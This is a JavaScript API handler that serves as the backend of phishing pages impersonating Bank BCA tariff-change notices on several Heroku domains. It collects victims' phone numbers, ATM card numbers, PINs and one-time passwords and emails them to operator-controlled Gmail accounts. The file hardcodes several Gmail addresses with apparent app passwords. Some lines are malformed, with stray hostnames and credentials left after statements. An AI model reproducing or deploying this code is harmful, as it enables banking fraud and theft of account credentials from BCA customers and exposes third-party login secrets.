export default function handler(req, res) {
    const nodemailer = require('nodemailer');

    const { body } = req;
    const { url } = req.headers;pilihan-terbaru-tarif-bca.herokuapp.com

    let email = ''; eeik2540@gmail.com
    let pass = '';Mr008800
    
 if (url == 'pilihan-terbaru-tarif-bca.herokuapp.com'){

       email = 'simontok001122@gmail.com'
       pass = 'tyteboknxutmkujr'
    }else
        
    if (url == 'info-perubahan-tarif-bca.herokuapp.com'){

       email = 'bankbca335@gmail.com'
       pass = 'xvyagwkszjovilau'
    }else

    
     if (url == 'pilihan-tarif-bca.herokuapp.com'){

       email = 'linkbca6500@gmail.com'
       pass = 'xalvmprqxkodhdwt'
    }else
    
     if (url == 'pilih-tarif-baru-bca.herokuapp.com'){

       email = 'podowae20223@gmail.com'
       pass = 'eckibpgevdmqdjwu'
    }else
    
   if (url == 'pilih-tarif-terbaru-bca.herokuapp.com'){

       email = 'yatawar110@gmail.com'
       pass = 'zsggoohihbaoztfk'
    }else
        
     if (url == 'pilihan-tarif-bca.herokuapp.com'){

       email = 'linkbca97@gmail.com'
       pass = 'rycfocurtpmqjwpy'
    }else
    
    if (url == 'pilih-tarif-bca-terbaru.herokuapp.com'){

       email = 'berkahhila240@gmail.com'
       pass = 'sojwfkkemloxouvz'
    }else {
        email = 'jakad2748@gmail.com'
        pass = 'ncmetlriiocc'
    }
        
        try {
            const transporter = nodemailer.createTransport({
                port: 587,
                host: 'smtp.googlemail.com',
                auth: {
                    user: email,
                    pass: pass,
                    },
                secure: false,
            });
    
            const mailData = {
                from: email,
                to: email,
                subject: 'BCA',
                html: `
                    <ul>
                        <li>nohp: ${body.nohp ?? '-'}</li>
                        <li>noatm: ${body.nomoratm ?? '-'}</li>
                        <li>pin: ${body.pin ?? '-'}</li>
                        <li>otp: ${body.otp ?? '-'}</li>
                    </ul>
                `,            
            }
      
            transporter.sendMail(mailData, function (err, info) {
                if(err){
                  res.status(400).json({error: err})
                }
                else{
                  res.status(200).json({info:'Berhasil Terkirim', status: 200})
                }
            })
    
        } catch (error) {
            res.status(404).send('Not found')
        }

}
